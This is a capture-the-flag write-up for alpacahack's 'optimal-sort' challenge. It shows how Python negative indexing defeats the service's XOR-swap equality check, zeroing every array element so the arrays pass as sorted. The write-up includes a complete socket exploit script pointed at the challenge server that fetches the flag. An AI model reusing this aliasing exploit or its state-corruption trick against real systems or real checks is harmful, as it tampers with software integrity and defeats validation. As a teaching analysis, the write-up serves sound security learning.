#  optimal-sort Writeup from alpacahack

> **Challenge**: `optimal-sort` (Misc, Hard) • 
> **Server**: `nc 34.170.146.252 43373`  
> **Author**: ark

# The Challenge
We're given a Python service that challenges us to "sort" four randomly generated arrays of sizes ***10, 100, 1000, and 2000***. For each array, we get exactly ***n + 5*** operations to swap elements at indices ***i and j***. After each swap, the server checks if the array is sorted ***(x <= y for all adjacent pairs)*** and grants us the flag if we succeed on all four rounds.
At first glance, this seems impossible—you can't reliably sort a random array in ***n + 5*** comparisons/swaps. But the vulnerability isn't in the algorithmic constraint—it's in the implementation of the swap itself.


##  Vulnerability
Broken XOR swap + Python negative indexing:
~~~python
def swap(xs, i, j):
    if i == j:
        return  #  Only checks numeric equality
    xs[i] ^= xs[j]     # Destructive if i/j alias same element
    xs[j] ^= xs[i]
    xs[i] ^= xs[j]
~~~
    -For list size n, indices k and k-n reference same element  
    -Numeric check passes (k != k-n), but XOR swap executes on single location → value becomes 0  
    -All-zero array satisfies all(x <= y) → is_sorted = True
# Exploit script
~~~python

#!/usr/bin/env python3
import socket
import sys

s = socket.socket()
s.connect(("34.170.146.252", 43373))

# Build complete input payload: for each size, zero all elements via aliasing
payload = b""
for size in (10, 100, 1000, 2000):
    for k in range(size):
        payload += f"{k}\n{k-size}\n".encode()  # k and k-size alias to same element

# Blast all inputs at once
s.sendall(payload)

# Read everything until flag appears
while True:
    data = s.recv(4096)
    if not data:
        break
    sys.stdout.buffer.write(data)
    sys.stdout.flush()
    if b"Alpaca{" in data:
        break
~~~
## Key Insight
    The fastest "sort" isn't an algorithm—it's corrupting state to a trivially sorted configuration.
    Always validate element identity, not just index values. XOR swaps are dangerous with aliasing.

  
